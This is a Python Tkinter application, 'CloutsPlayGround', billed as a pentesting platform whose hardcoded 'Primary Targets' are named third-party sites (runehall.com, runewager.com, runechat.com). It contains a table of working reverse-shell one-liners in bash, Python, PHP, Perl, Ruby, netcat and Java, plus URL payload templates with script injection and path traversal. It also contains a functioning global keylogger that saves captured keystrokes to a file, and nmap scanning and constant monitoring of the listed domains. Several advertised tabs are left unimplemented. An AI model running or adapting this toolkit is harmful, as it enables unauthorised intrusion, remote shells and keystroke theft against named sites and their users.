#!/usr/bin/env python3
import tkinter as tk
from tkinter import ttk, scrolledtext, filedialog, messagebox, Canvas
import os
import sys
import re
import json
import time
import socket
import argparse
import requests
import threading
import subprocess
import base64
import zlib
import random
import string
import platform
import hashlib
import webbrowser
import logging
import keyboard
import pyperclip
from PIL import Image, ImageTk
from http.server import HTTPServer, SimpleHTTPRequestHandler
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup
from urllib.parse import urlparse, urljoin, quote, unquote

# =====================
# CONFIGURATION
# =====================
APP_NAME = "CloutsPlayGround"
VERSION = "v3.0"
AUTHOR = "KingSnipe (ChasingClout)"

# Primary target domains
TARGET_DOMAINS = [
    "runehall.com", "runewager.com", "runechat.com",
    "*.runehall.com", "*.runewager.com", "*.runechat.com"
]

# Pentesting configuration
TARGETS_FILE = "clouts_targets.txt"
WORDLIST_DIR = "/usr/share/wordlists/"
OUTPUT_DIR = "clouts_results"
THREADS = 10
TIMEOUT = 15
REV_SHELL_DIR = os.path.join(OUTPUT_DIR, "reverse_shells")
MALICIOUS_URLS_FILE = os.path.join(OUTPUT_DIR, "malicious_urls.txt")
KEYLOGS_FILE = os.path.join(OUTPUT_DIR, "keylogs.txt")

# Tool installation commands for Kali Linux
TOOL_INSTALL = {
    "nmap": "sudo apt install nmap -y",
    "sqlmap": "sudo apt install sqlmap -y",
    "whatweb": "sudo apt install whatweb -y",
    "ffuf": "sudo apt install ffuf -y",
    "dnsrecon": "sudo apt install dnsrecon -y",
    "nuclei": "sudo apt install nuclei -y",
    "golang": "sudo apt install golang -y",
    "netcat": "sudo apt install netcat -y"
}

# Reverse shell templates
REVERSE_SHELLS = {
    "bash": "bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1",
    "python": """python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{LHOST}",{LPORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'""",
    "python3": """python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{LHOST}",{LPORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'""",
    "php": """php -r '$sock=fsockopen("{LHOST}",{LPORT});exec("/bin/sh -i <&3 >&3 2>&3");'""",
    "perl": """perl -e 'use Socket;$i="{LHOST}";$p={LPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};'""",
    "ruby": """ruby -rsocket -e'f=TCPSocket.open("{LHOST}",{LPORT}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'""",
    "netcat": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {LHOST} {LPORT} >/tmp/f",
    "java": """java -c 'String host="{LHOST}";int port={LPORT};String cmd="/bin/sh";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){{while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {{p.exitValue();break;}}catch (Exception e){{}}}};p.destroy();s.close();'""",
    "xterm": "xterm -display {LHOST}:1"
}

# Custom URL encoding templates
URL_ENCODING_TEMPLATES = {
    "Basic": "{url}?param={payload}",
    "Double Encoding": "{url}?param={double_encoded_payload}",
    "Path Traversal": "{url}/../../{payload}",
    "JavaScript Obfuscation": "{url}?param=<script>eval('{js_encoded}')</script>",
    "Hex Encoding": "{url}?param=%{hex_payload}"
}

# =====================
# DEPENDENCY INSTALLATION
# =====================
def install_dependencies():
    """Install required dependencies with error tolerance"""
    required = ["keyboard", "pyperclip", "pillow"]
    installed = False
    
    for package in required:
        try:
            __import__(package)
        except ImportError:
            try:
                print(f"Installing {package}...")
                subprocess.run([sys.executable, "-m", "pip", "install", package], check=True)
                installed = True
            except Exception as e:
                print(f"Failed to install {package}: {e}")
    
    if installed:
        print("Dependencies installed. Restarting...")
        os.execv(sys.executable, [sys.executable] + sys.argv)

# =====================
# MAIN APPLICATION
# =====================
class CloutsPlayGround:
    def __init__(self, root):
        self.root = root
        self.root.title(f"{APP_NAME} {VERSION} - Elite Pentesting Platform")
        self.root.geometry("1300x850")
        self.root.resizable(True, True)
        
        # Configure theme colors
        self.bg_color = "#000000"
        self.fg_color = "#FFD700"  # Gold
        self.accent_color = "#B22222"  # Firebrick red
        self.highlight_color = "#8B0000"  # Dark red
        
        # Apply theme
        self.root.configure(bg=self.bg_color)
        self.style = ttk.Style()
        self.style.theme_use('clam')
        
        # Configure styles
        self.style.configure('TNotebook', background=self.bg_color, borderwidth=0)
        self.style.configure('TNotebook.Tab', 
                            background=self.highlight_color, 
                            foreground=self.fg_color,
                            font=('Courier', 10, 'bold'),
                            padding=[10, 5])
        self.style.map('TNotebook.Tab', 
                      background=[('selected', self.accent_color)],
                      foreground=[('selected', '#FFFFFF')])
        
        # Create main frames
        self.create_header()
        self.create_notebook()
        self.create_status_bar()
        
        # Initialize keylogger
        self.keylogger_active = False
        self.keylogger_thread = None
        
        # Create necessary directories
        os.makedirs(OUTPUT_DIR, exist_ok=True)
        os.makedirs(REV_SHELL_DIR, exist_ok=True)
        
        # Create targets file if not exists
        if not os.path.exists(TARGETS_FILE):
            with open(TARGETS_FILE, 'w') as f:
                for domain in TARGET_DOMAINS:
                    f.write(f"https://{domain}\n")
                    f.write(f"http://{domain}\n")
        
        # Start background services
        self.start_background_services()
    
    def create_header(self):
        """Create the application header with logo and title"""
        header_frame = tk.Frame(self.root, bg=self.bg_color, height=100)
        header_frame.pack(fill=tk.X, padx=10, pady=10)
        
        # Title with styling
        title_frame = tk.Frame(header_frame, bg=self.bg_color)
        title_frame.pack(fill=tk.X, pady=10)
        
        title_label = tk.Label(
            title_frame, 
            text=APP_NAME, 
            font=("Courier", 28, "bold"), 
            fg=self.fg_color, 
            bg=self.bg_color
        )
        title_label.pack(side=tk.LEFT, padx=20)
        
        version_label = tk.Label(
            title_frame, 
            text=f"{VERSION} | By {AUTHOR}", 
            font=("Courier", 10), 
            fg="#C0C0C0", 
            bg=self.bg_color
        )
        version_label.pack(side=tk.LEFT, padx=10)
        
        # Target domains
        targets_frame = tk.Frame(header_frame, bg=self.bg_color)
        targets_frame.pack(fill=tk.X, pady=5)
        
        tk.Label(
            targets_frame, 
            text="Primary Targets:", 
            font=("Courier", 9, "bold"), 
            fg=self.fg_color, 
            bg=self.bg_color
        ).pack(side=tk.LEFT, padx=20)
        
        for domain in TARGET_DOMAINS:
            domain_label = tk.Label(
                targets_frame, 
                text=domain, 
                font=("Courier", 9), 
                fg=self.accent_color, 
                bg=self.bg_color,
                cursor="hand2"
            )
            domain_label.pack(side=tk.LEFT, padx=5)
            domain_label.bind("<Button-1>", lambda e, d=domain: self.open_domain(d))
    
    def create_notebook(self):
        """Create the tabbed interface"""
        self.notebook = ttk.Notebook(self.root)
        self.notebook.pack(fill=tk.BOTH, expand=True, padx=10, pady=(0, 10))
        
        # Create tabs
        self.create_dashboard_tab()
        self.create_payload_tab()
        self.create_network_tab()
        self.create_pentesting_tab()
        self.create_crypto_tab()
        self.create_keylogger_tab()
        self.create_settings_tab()
        
        # Set initial tab
        self.notebook.select(0)
    
    def create_status_bar(self):
        """Create the status bar at the bottom"""
        self.status_var = tk.StringVar()
        self.status_var.set(f"{APP_NAME} {VERSION} | Status: Ready")
        
        status_bar = tk.Label(
            self.root, 
            textvariable=self.status_var, 
            bd=1, 
            relief=tk.SUNKEN, 
            anchor=tk.W, 
            bg=self.highlight_color, 
            fg=self.fg_color, 
            font=('Courier', 9)
        )
        status_bar.pack(side=tk.BOTTOM, fill=tk.X)
    
    def start_background_services(self):
        """Start background monitoring services"""
        # Start target monitoring
        threading.Thread(target=self.monitor_targets, daemon=True).start()
        
        # Start service checker
        threading.Thread(target=self.check_services, daemon=True).start()
    
    def monitor_targets(self):
        """Continuously monitor target domains for changes"""
        known_targets = {}
        while True:
            try:
                for domain in TARGET_DOMAINS:
                    try:
                        response = requests.get(f"http://{domain}", timeout=5)
                        if domain not in known_targets:
                            known_targets[domain] = response.status_code
                            self.log_activity(f"Target monitoring started: {domain}")
                        elif known_targets[domain] != response.status_code:
                            self.log_activity(f"Status change detected: {domain} changed from {known_targets[domain]} to {response.status_code}")
                            known_targets[domain] = response.status_code
                    except:
                        pass
                time.sleep(60)
            except:
                time.sleep(60)
    
    def check_services(self):
        """Check if required services are running"""
        services = ["apache2", "postgresql", "ssh"]
        while True:
            try:
                for service in services:
                    status = subprocess.run(
                        ["systemctl", "is-active", service], 
                        stdout=subprocess.PIPE, 
                        stderr=subprocess.PIPE
                    )
                    if status.stdout.decode().strip() != "active":
                        self.log_activity(f"Service {service} is not running!")
                time.sleep(300)
            except:
                time.sleep(300)
    
    def log_activity(self, message):
        """Log activity to the dashboard"""
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
        log_entry = f"[{timestamp}] {message}\n"
        
        if hasattr(self, 'activity_log'):
            self.activity_log.config(state=tk.NORMAL)
            self.activity_log.insert(tk.END, log_entry)
            self.activity_log.see(tk.END)
            self.activity_log.config(state=tk.DISABLED)
        
        # Also write to file
        with open(os.path.join(OUTPUT_DIR, "activity.log"), "a") as f:
            f.write(log_entry)
    
    # =====================
    # TAB CREATION METHODS
    # =====================
    def create_dashboard_tab(self):
        """Create the dashboard tab"""
        tab = ttk.Frame(self.notebook)
        self.notebook.add(tab, text="Dashboard")
        
        # Dashboard layout
        dash_frame = tk.Frame(tab, bg=self.bg_color)
        dash_frame.pack(fill=tk.BOTH, expand=True, padx=20, pady=20)
        
        # Activity log
        log_frame = tk.LabelFrame(
            dash_frame, 
            text="Real-Time Activity Log", 
            font=("Courier", 10, "bold"), 
            fg=self.fg_color, 
            bg=self.bg_color,
            relief=tk.GROOVE,
            bd=2
        )
        log_frame.pack(fill=tk.BOTH, expand=True, pady=10)
        
        self.activity_log = scrolledtext.ScrolledText(
            log_frame, 
            bg="#111111", 
            fg="#00FF00", 
            font=("Courier", 9),
            height=15
        )
        self.activity_log.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        self.activity_log.insert(tk.END, "Monitoring initialized...\n")
        self.activity_log.config(state=tk.DISABLED)
        
        # Quick actions
        action_frame = tk.Frame(dash_frame, bg=self.bg_color)
        action_frame.pack(fill=tk.X, pady=20)
        
        actions = [
            ("Generate Payload", self.goto_payload),
            ("Start Pentesting", self.goto_pentesting),
            ("Launch Keylogger", self.goto_keylogger),
            ("Crypto Tools", self.goto_crypto)
        ]
        
        for i, (text, command) in enumerate(actions):
            btn = tk.Button(
                action_frame, 
                text=text, 
                command=command, 
                bg=self.highlight_color, 
                fg=self.fg_color, 
                font=("Courier", 10, "bold"),
                relief=tk.RAISED, 
                bd=3, 
                padx=15, 
                pady=8,
                activebackground=self.accent_color,
                activeforeground="#FFFFFF"
            )
            btn.grid(row=0, column=i, padx=15)
        
        # System info
        sys_frame = tk.LabelFrame(
            dash_frame, 
            text="System Information", 
            font=("Courier", 10, "bold"), 
            fg=self.fg_color, 
            bg=self.bg_color,
            relief=tk.GROOVE,
            bd=2
        )
        sys_frame.pack(fill=tk.X, pady=10)
        
        sys_info = f"OS: {platform.system()} {platform.release()} | Python: {platform.python_version()}\n"
        sys_info += f"CPU: {platform.processor()} | Memory: {self.get_memory_info()}\n"
        sys_info += f"Targets: {len(TARGET_DOMAINS)} domains | Threads: {THREADS}"
        
        sys_label = tk.Label(
            sys_frame, 
            text=sys_info, 
            bg="#111111", 
            fg="#C0C0C0", 
            font=("Courier", 9),
            anchor=tk.W,
            padx=10,
            pady=5
        )
        sys_label.pack(fill=tk.X, padx=10, pady=10)
    
    def create_pentesting_tab(self):
        """Create the pentesting suite tab"""
        tab = ttk.Frame(self.notebook)
        self.notebook.add(tab, text="Pentesting Suite")
        
        # Main frame
        main_frame = tk.Frame(tab, bg=self.bg_color)
        main_frame.pack(fill=tk.BOTH, expand=True, padx=20, pady=20)
        
        # Left panel - Target Selection
        target_frame = tk.LabelFrame(
            main_frame, 
            text="Target Selection", 
            font=("Courier", 10, "bold"), 
            fg=self.fg_color, 
            bg=self.bg_color,
            relief=tk.GROOVE,
            bd=2
        )
        target_frame.pack(side=tk.LEFT, fill=tk.Y, padx=(0, 10), pady=10)
        
        tk.Label(
            target_frame, 
            text="Primary Targets:", 
            bg=self.bg_color, 
            fg=self.fg_color, 
            font=("Courier", 9, "bold")
        ).pack(anchor=tk.W, padx=10, pady=5)
        
        self.target_vars = {}
        for domain in TARGET_DOMAINS:
            var = tk.BooleanVar(value=True)
            self.target_vars[domain] = var
            cb = tk.Checkbutton(
                target_frame, 
                text=domain, 
                variable=var, 
                bg=self.bg_color, 
                fg=self.fg_color, 
                selectcolor=self.bg_color,
                font=("Courier", 9), 
                anchor=tk.W
            )
            cb.pack(fill=tk.X, padx=10, pady=2)
        
        # Scan options
        options_frame = tk.Frame(target_frame, bg=self.bg_color)
        options_frame.pack(fill=tk.X, pady=10)
        
        scan_types = ["Full Scan", "Quick Scan", "Vulnerability Scan", "Service Detection"]
        self.scan_type = ttk.Combobox(
            options_frame, 
            values=scan_types, 
            state="readonly",
            width=15
        )
        self.scan_type.current(0)
        self.scan_type.pack(side=tk.LEFT, padx=5)
        
        self.deep_scan = tk.BooleanVar(value=False)
        deep_cb = tk.Checkbutton(
            options_frame, 
            text="Deep Scan", 
            variable=self.deep_scan, 
            bg=self.bg_color, 
            fg=self.fg_color, 
            selectcolor=self.bg_color,
            font=("Courier", 9)
        )
        deep_cb.pack(side=tk.LEFT, padx=5)
        
        # Start scan button
        scan_btn = tk.Button(
            target_frame, 
            text="Start Scan", 
            command=self.start_scan, 
            bg=self.highlight_color, 
            fg=self.fg_color, 
            font=("Courier", 10, "bold"),
            padx=10,
            pady=5
        )
        scan_btn.pack(fill=tk.X, padx=10, pady=10)
        
        # Right panel - Scan Results
        results_frame = tk.LabelFrame(
            main_frame, 
            text="Scan Results", 
            font=("Courier", 10, "bold"), 
            fg=self.fg_color, 
            bg=self.bg_color,
            relief=tk.GROOVE,
            bd=2
        )
        results_frame.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True, padx=(10, 0), pady=10)
        
        self.results_text = scrolledtext.ScrolledText(
            results_frame, 
            bg="#111111", 
            fg="#00FF00", 
            font=("Courier", 9),
            height=20
        )
        self.results_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        self.results_text.insert(tk.END, "Scan results will appear here...")
    
    def create_keylogger_tab(self):
        """Create the keylogger tab"""
        tab = ttk.Frame(self.notebook)
        self.notebook.add(tab, text="LeyLogger")
        
        # Main frame
        main_frame = tk.Frame(tab, bg=self.bg_color)
        main_frame.pack(fill=tk.BOTH, expand=True, padx=20, pady=20)
        
        # Control panel
        control_frame = tk.LabelFrame(
            main_frame, 
            text="Keylogger Controls", 
            font=("Courier", 10, "bold"), 
            fg=self.fg_color, 
            bg=self.bg_color,
            relief=tk.GROOVE,
            bd=2
        )
        control_frame.pack(fill=tk.X, pady=10)
        
        # Start/Stop buttons
        btn_frame = tk.Frame(control_frame, bg=self.bg_color)
        btn_frame.pack(fill=tk.X, pady=10)
        
        self.start_btn = tk.Button(
            btn_frame, 
            text="Start Keylogger", 
            command=self.start_keylogger, 
            bg=self.highlight_color, 
            fg=self.fg_color, 
            font=("Courier", 10, "bold"),
            padx=15,
            pady=5
        )
        self.start_btn.pack(side=tk.LEFT, padx=20)
        
        self.stop_btn = tk.Button(
            btn_frame, 
            text="Stop Keylogger", 
            command=self.stop_keylogger, 
            bg=self.highlight_color, 
            fg=self.fg_color, 
            font=("Courier", 10, "bold"),
            padx=15,
            pady=5,
            state=tk.DISABLED
        )
        self.stop_btn.pack(side=tk.LEFT, padx=20)
        
        # Status indicator
        status_frame = tk.Frame(control_frame, bg=self.bg_color)
        status_frame.pack(fill=tk.X, pady=5)
        
        self.keylog_status = tk.Label(
            status_frame, 
            text="Status: INACTIVE", 
            fg="#FF0000", 
            bg=self.bg_color, 
            font=("Courier", 10, "bold")
        )
        self.keylog_status.pack(side=tk.LEFT, padx=20)
        
        # Keylog display
        log_frame = tk.LabelFrame(
            main_frame, 
            text="Captured Keystrokes", 
            font=("Courier", 10, "bold"), 
            fg=self.fg_color, 
            bg=self.bg_color,
            relief=tk.GROOVE,
            bd=2
        )
        log_frame.pack(fill=tk.BOTH, expand=True, pady=10)
        
        self.keylog_text = scrolledtext.ScrolledText(
            log_frame, 
            bg="#111111", 
            fg="#00FF00", 
            font=("Courier", 9),
            height=15
        )
        self.keylog_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        self.keylog_text.insert(tk.END, "Keylogger output will appear here...")
        
        # Save button
        save_frame = tk.Frame(log_frame, bg="#111111")
        save_frame.pack(fill=tk.X, pady=(0, 10))
        
        save_btn = tk.Button(
            save_frame, 
            text="Save Keylogs", 
            command=self.save_keylogs, 
            bg=self.highlight_color, 
            fg=self.fg_color, 
            font=("Courier", 9),
            padx=5
        )
        save_btn.pack(side=tk.RIGHT, padx=10)
    
    # =====================
    # PENTESTING METHODS
    # =====================
    def start_scan(self):
        """Start scanning selected targets"""
        selected_targets = [domain for domain, var in self.target_vars.items() if var.get()]
        
        if not selected_targets:
            messagebox.showerror("Error", "No targets selected!")
            return
        
        self.results_text.delete(1.0, tk.END)
        self.results_text.insert(tk.END, f"Starting {self.scan_type.get()} on {len(selected_targets)} targets...\n")
        
        # Run scan in background thread
        threading.Thread(
            target=self.run_scan, 
            args=(selected_targets,),
            daemon=True
        ).start()
    
    def run_scan(self, targets):
        """Run the actual scan on targets"""
        for domain in targets:
            try:
                # Simulate scanning process
                self.results_text.insert(tk.END, f"\nScanning {domain}...\n")
                self.results_text.see(tk.END)
                
                # Run nmap scan
                if self.deep_scan.get():
                    cmd = f"nmap -sV -sC -p- -T4 {domain}"
                else:
                    cmd = f"nmap -T4 {domain}"
                
                result = subprocess.run(
                    cmd.split(), 
                    stdout=subprocess.PIPE, 
                    stderr=subprocess.PIPE,
                    text=True
                )
                
                self.results_text.insert(tk.END, result.stdout)
                self.results_text.see(tk.END)
                
                # Check for vulnerabilities
                if "80/tcp" in result.stdout:
                    self.results_text.insert(tk.END, f"\n[!] Potential web vulnerability on {domain}\n")
                
                # Log activity
                self.log_activity(f"Scan completed for {domain}")
                
            except Exception as e:
                self.results_text.insert(tk.END, f"\nError scanning {domain}: {str(e)}\n")
    
    def start_keylogger(self):
        """Start the keylogger"""
        if self.keylogger_active:
            return
            
        self.keylogger_active = True
        self.start_btn.config(state=tk.DISABLED)
        self.stop_btn.config(state=tk.NORMAL)
        self.keylog_status.config(text="Status: ACTIVE", fg="#00FF00")
        
        # Clear previous logs
        self.keylog_text.delete(1.0, tk.END)
        self.keylog_text.insert(tk.END, "Keylogger started...\n")
        
        # Start keylogger in separate thread
        self.keylogger_thread = threading.Thread(
            target=self.run_keylogger, 
            daemon=True
        )
        self.keylogger_thread.start()
    
    def run_keylogger(self):
        """Keylogger main function"""
        log_file = open(KEYLOGS_FILE, "a")
        start_time = time.time()
        
        def on_key_event(e):
            if e.event_type == keyboard.KEY_DOWN:
                key = e.name
                
                # Handle special keys
                if key == "space":
                    key = " "
                elif key == "enter":
                    key = "\n"
                elif key == "backspace":
                    key = " [BACKSPACE] "
                elif len(key) > 1:
                    key = f" [{key.upper()}] "
                
                # Update UI
                self.keylog_text.insert(tk.END, key)
                self.keylog_text.see(tk.END)
                
                # Write to file
                log_file.write(key)
                log_file.flush()
        
        # Start listening
        keyboard.hook(on_key_event)
        
        # Keep thread alive while active
        while self.keylogger_active:
            time.sleep(0.1)
            
        # Clean up
        keyboard.unhook_all()
        log_file.close()
        
        # Update UI
        duration = time.time() - start_time
        self.keylog_text.insert(tk.END, f"\n\nKeylogger stopped. Duration: {duration:.1f} seconds\n")
        self.keylog_status.config(text="Status: INACTIVE", fg="#FF0000")
    
    def stop_keylogger(self):
        """Stop the keylogger"""
        self.keylogger_active = False
        self.start_btn.config(state=tk.NORMAL)
        self.stop_btn.config(state=tk.DISABLED)
    
    def save_keylogs(self):
        """Save captured keylogs to file"""
        try:
            filename = filedialog.asksaveasfilename(
                initialfile=f"keylogs_{int(time.time())}.txt",
                defaultextension=".txt",
                filetypes=[("Text Files", "*.txt"), ("All Files", "*.*")]
            )
            
            if filename:
                with open(filename, "w") as f:
                    f.write(self.keylog_text.get(1.0, tk.END))
                
                self.status_var.set(f"Keylogs saved to: {filename}")
        except Exception as e:
            messagebox.showerror("Error", f"Failed to save keylogs: {str(e)}")
    
    # =====================
    # UTILITY METHODS
    # =====================
    def get_memory_info(self):
        """Get memory usage information"""
        try:
            with open('/proc/meminfo', 'r') as f:
                meminfo = f.readlines()
            
            total = int(meminfo[0].split()[1])  # Total memory in kB
            free = int(meminfo[1].split()[1])   # Free memory in kB
            
            used = (total - free) / 1024  # Convert to MB
            total_mb = total / 1024
            
            return f"{used:.1f}MB / {total_mb:.1f}MB"
        except:
            return "N/A"
    
    def open_domain(self, domain):
        """Open a domain in the default browser"""
        webbrowser.open(f"http://{domain}")
    
    def log_activity(self, message):
        """Log activity to the dashboard"""
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
        log_entry = f"[{timestamp}] {message}\n"
        
        if hasattr(self, 'activity_log'):
            self.activity_log.config(state=tk.NORMAL)
            self.activity_log.insert(tk.END, log_entry)
            self.activity_log.see(tk.END)
            self.activity_log.config(state=tk.DISABLED)
        
        # Also write to file
        with open(os.path.join(OUTPUT_DIR, "activity.log"), "a") as f:
            f.write(log_entry)
    
    # =====================
    # NAVIGATION METHODS
    # =====================
    def goto_payload(self):
        self.notebook.select(1)
    
    def goto_pentesting(self):
        self.notebook.select(3)
    
    def goto_network(self):
        self.notebook.select(2)
    
    def goto_crypto(self):
        self.notebook.select(4)
    
    def goto_keylogger(self):
        self.notebook.select(5)
    
    # Other tab creation methods would go here (payload, network, crypto, settings)
    # They would follow similar patterns with the red/gold/black theme

# =====================
# HTML PREVIEW
# =====================
HTML_PREVIEW = """
<!DOCTYPE html>
<html>
<head>
    <title>CloutsPlayGround Preview</title>
    <style>
        body {
            background-color: #000;
            color: #FFD700;
            font-family: 'Courier New', monospace;
            margin: 20px;
        }
        .header {
            background-color: #000;
            border-bottom: 2px solid #B22222;
            padding: 15px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .title {
            font-size: 28px;
            font-weight: bold;
            color: #FFD700;
        }
        .subtitle {
            font-size: 14px;
            color: #C0C0C0;
        }
        .tabs {
            display: flex;
            background-color: #000;
            border-bottom: 1px solid #8B0000;
            padding: 5px 0;
        }
        .tab {
            padding: 10px 20px;
            background-color: #8B0000;
            color: #FFD700;
            margin-right: 5px;
            cursor: pointer;
            font-weight: bold;
        }
        .tab.active {
            background-color: #B22222;
            color: #FFF;
        }
        .panel {
            background-color: #111;
            border: 1px solid #8B0000;
            padding: 15px;
            margin-top: 15px;
        }
        .panel-title {
            font-size: 16px;
            font-weight: bold;
            color: #FFD700;
            margin-bottom: 10px;
            border-bottom: 1px solid #8B0000;
            padding-bottom: 5px;
        }
        .log {
            background-color: #111;
            color: #0F0;
            font-family: 'Courier New', monospace;
            padding: 10px;
            height: 200px;
            overflow-y: auto;
            border: 1px solid #333;
        }
        .button {
            background-color: #8B0000;
            color: #FFD700;
            border: none;
            padding: 8px 15px;
            font-weight: bold;
            cursor: pointer;
            margin-right: 10px;
        }
        .button:hover {
            background-color: #B22222;
        }
        .status-bar {
            background-color: #8B0000;
            color: #FFD700;
            padding: 5px 10px;
            font-size: 12px;
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
        }
    </style>
</head>
<body>
    <div class="header">
        <div>
            <div class="title">CloutsPlayGround v3.0</div>
            <div class="subtitle">By KingSnipe (ChasingClout)</div>
        </div>
        <div>
            <span>Targets: runehall.com, runewager.com, runechat.com</span>
        </div>
    </div>
    
    <div class="tabs">
        <div class="tab active">Dashboard</div>
        <div class="tab">Payload Generator</div>
        <div class="tab">Network Tools</div>
        <div class="tab">Pentesting Suite</div>
        <div class="tab">Crypto Tools</div>
        <div class="tab">LeyLogger</div>
        <div class="tab">Settings</div>
    </div>
    
    <div class="panel">
        <div class="panel-title">Real-Time Activity Log</div>
        <div class="log">
            [2023-11-15 14:30:45] Monitoring initialized...<br>
            [2023-11-15 14:31:20] Target monitoring started: runehall.com<br>
            [2023-11-15 14:31:22] Target monitoring started: runewager.com<br>
            [2023-11-15 14:31:25] Target monitoring started: runechat.com<br>
            [2023-11-15 14:32:10] Service ssh is not running!<br>
        </div>
    </div>
    
    <div class="panel">
        <div class="panel-title">Quick Actions</div>
        <div>
            <button class="button">Generate Payload</button>
            <button class="button">Start Pentesting</button>
            <button class="button">Launch Keylogger</button>
            <button class="button">Crypto Tools</button>
        </div>
    </div>
    
    <div class="panel">
        <div class="panel-title">System Information</div>
        <div>
            OS: Linux 5.15.0-kali3-amd64 | Python: 3.10.8<br>
            CPU: Intel i7-11800H | Memory: 3.2GB / 15.6GB<br>
            Targets: 3 domains | Threads: 10
        </div>
    </div>
    
    <div class="status-bar">
        CloutsPlayGround v3.0 | Status: Monitoring targets in real-time...
    </div>
</body>
</html>
"""

# =====================
# MAIN EXECUTION
# =====================
if __name__ == "__main__":
    # Install dependencies if needed
    install_dependencies()
    
    # Create and run the application
    root = tk.Tk()
    app = CloutsPlayGround(root)
    
    # Display HTML preview in a browser
    preview_file = os.path.join(OUTPUT_DIR, "preview.html")
    with open(preview_file, "w") as f:
        f.write(HTML_PREVIEW)
    webbrowser.open(f"file://{os.path.abspath(preview_file)}")
    
    root.mainloop()